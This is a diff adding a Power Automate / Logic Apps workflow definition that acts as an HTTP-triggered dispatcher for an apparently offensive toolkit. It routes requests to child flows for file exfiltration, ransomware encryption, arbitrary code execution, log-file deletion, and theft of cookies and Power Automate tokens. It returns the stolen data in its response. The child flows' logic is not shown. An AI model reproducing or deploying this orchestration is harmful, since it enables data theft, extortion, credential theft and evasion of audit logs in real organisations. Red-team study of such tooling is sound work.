@@ -1,0 +1,424 @@
+{
+  "properties": {
+    "connectionReferences": {},
+    "definition": {
+      "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+      "contentVersion": "1.0.0.0",
+      "parameters": {
+        "$authentication": {
+          "defaultValue": {},
+          "type": "SecureObject"
+        }
+      },
+      "triggers": {
+        "manual": {
+          "metadata": {
+            "operationMetadataId": "0971a230-aaea-49ac-8fb8-e3c9d53bff1f"
+          },
+          "type": "Request",
+          "kind": "Http",
+          "inputs": {
+            "schema": {
+              "type": "object",
+              "properties": {
+                "FlowToRun": {
+                  "type": "string"
+                },
+                "ExfilTargetFile": {
+                  "type": "string"
+                },
+                "RansomwareCrawlDepth": {
+                  "type": "string"
+                },
+                "RansomwareDirectoriesToInitCrawl": {
+                  "type": "string"
+                },
+                "RansomwareEncryptionKey": {
+                  "type": "string"
+                },
+                "CodeExecCommand": {
+                  "type": "string"
+                },
+                "CodeExecCommandType": {
+                  "type": "string"
+                },
+                "StealCookieFQDN": {
+                  "type": "string"
+                }
+              }
+            },
+            "method": "POST"
+          }
+        }
+      },
+      "actions": {
+        "Switch": {
+          "runAfter": {
+            "Initialize_body": [
+              "Succeeded"
+            ]
+          },
+          "cases": {
+            "Case_Exfil": {
+              "case": "Exfil",
+              "actions": {
+                "Run_Exfil": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "78740706-9dec-ec11-bb3d-0022482ca4a7"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable": {
+                  "runAfter": {
+                    "Run_Exfil": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_Exfil')"
+                  }
+                }
+              }
+            },
+            "Case_Ransomware": {
+              "case": "Ransomware",
+              "actions": {
+                "Run_Ransomware": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "76740706-9dec-ec11-bb3d-0022482ca4a7"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable_2": {
+                  "runAfter": {
+                    "Run_Ransomware": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_Ransomware')"
+                  }
+                }
+              }
+            },
+            "Case_CodeExec": {
+              "case": "CodeExec",
+              "actions": {
+                "Run_a_CodeExec": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "75740706-9dec-ec11-bb3d-0022482ca4a7"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable_3": {
+                  "runAfter": {
+                    "Run_a_CodeExec": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_a_CodeExec')"
+                  }
+                }
+              }
+            },
+            "Case_Cleanup": {
+              "case": "Cleanup",
+              "actions": {
+                "Run_Cleanup": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "77740706-9dec-ec11-bb3d-0022482ca4a7"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable_4": {
+                  "runAfter": {
+                    "Run_Cleanup": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_Cleanup')"
+                  }
+                }
+              }
+            },
+            "Case_StealPowerAutomateToken": {
+              "case": "StealPowerAutomateToken",
+              "actions": {
+                "Run_StealPowerAutomateToken": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "8c5c57da-f404-ed11-82e4-0022481bf843"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable_5": {
+                  "runAfter": {
+                    "Run_StealPowerAutomateToken": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_StealPowerAutomateToken')"
+                  }
+                }
+              }
+            },
+            "Case_StealCookie": {
+              "case": "StealCookie",
+              "actions": {
+                "Run_StealCookie": {
+                  "runAfter": {},
+                  "type": "Workflow",
+                  "inputs": {
+                    "host": {
+                      "workflowReferenceName": "8b5c57da-f404-ed11-82e4-0022481bf843"
+                    },
+                    "body": {
+                      "FlowToRun": "@triggerBody()?['FlowToRun']",
+                      "ExfilTargetFile": "@triggerBody()?['ExfilTargetFile']",
+                      "RansomwareCrawlDepth": "@triggerBody()?['RansomwareCrawlDepth']",
+                      "RansomwareDirectoriesToInitCrawl": "@triggerBody()?['RansomwareDirectoriesToInitCrawl']",
+                      "RansomwareEncryptionKey": "@triggerBody()?['RansomwareEncryptionKey']",
+                      "CodeExecCommand": "@triggerBody()?['CodeExecCommand']",
+                      "CodeExecCommandType": "@triggerBody()?['CodeExecCommandType']",
+                      "StealCookieFQDN": "@triggerBody()?['StealCookieFQDN']"
+                    }
+                  }
+                },
+                "Set_variable_6": {
+                  "runAfter": {
+                    "Run_StealCookie": [
+                      "Succeeded"
+                    ]
+                  },
+                  "type": "SetVariable",
+                  "inputs": {
+                    "name": "body",
+                    "value": "@body('Run_StealCookie')"
+                  }
+                }
+              }
+            }
+          },
+          "default": {
+            "actions": {
+              "Terminate": {
+                "runAfter": {},
+                "type": "Terminate",
+                "inputs": {
+                  "runStatus": "Failed",
+                  "runError": {
+                    "message": "FlowToRun value not supported"
+                  }
+                }
+              }
+            }
+          },
+          "expression": "@triggerBody()?['FlowToRun']",
+          "metadata": {
+            "operationMetadataId": "2305a8af-1931-4505-8662-c175b209af96"
+          },
+          "type": "Switch"
+        },
+        "Response": {
+          "runAfter": {
+            "Switch": [
+              "Succeeded"
+            ]
+          },
+          "metadata": {
+            "operationMetadataId": "107d3152-c56f-4fae-9670-930337337ec2"
+          },
+          "type": "Response",
+          "kind": "Http",
+          "inputs": {
+            "statusCode": 200,
+            "body": "@variables('body')",
+            "schema": {
+              "type": "object",
+              "properties": {
+                "FlowSuccess": {
+                  "type": "boolean"
+                },
+                "FlowType": {
+                  "type": "string"
+                },
+                "FlowErrors": {
+                  "type": "object",
+                  "properties": {
+                    "AttendedRunError": {
+                      "type": "object",
+                      "properties": {}
+                    },
+                    "UnattendedRunError": {
+                      "type": "object",
+                      "properties": {}
+                    }
+                  }
+                },
+                "CodeExec": {
+                  "type": "object",
+                  "properties": {
+                    "ScriptOutput": {
+                      "type": "string"
+                    },
+                    "ScriptError": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Exfil": {
+                  "type": "object",
+                  "properties": {
+                    "Success": {
+                      "type": "boolean"
+                    },
+                    "FileContents": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Ransomware": {
+                  "type": "object",
+                  "properties": {
+                    "FilesFound": {
+                      "type": "integer"
+                    },
+                    "FilesAccessed": {
+                      "type": "integer"
+                    },
+                    "FilesProcessed": {
+                      "type": "integer"
+                    },
+                    "Errors": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Cleanup": {
+                  "type": "object",
+                  "properties": {
+                    "LogFilesFound": {
+                      "type": "integer"
+                    },
+                    "LogFilesDeleted": {
+                      "type": "integer"
+                    }
+                  }
+                },
+                "StealCookie": {
+                  "type": "object",
+                  "properties": {
+                    "Cookie": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "StealPowerAutomateToken": {
+                  "type": "object",
+                  "properties": {
+                    "Token": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        },
+        "Initialize_body": {
+          "runAfter": {},
+          "metadata": {
+            "operationMetadataId": "83ab6f15-5d35-414e-9f9f-9d5677cdbc13"
+          },
+          "type": "InitializeVariable",
+          "inputs": {
+            "variables": [
+              {
+                "name": "body",
+                "type": "object"
+              }
+            ]
+          }
+        }
+      }
+    }
+  },
+  "schemaVersion": "1.0.0.0"
+}
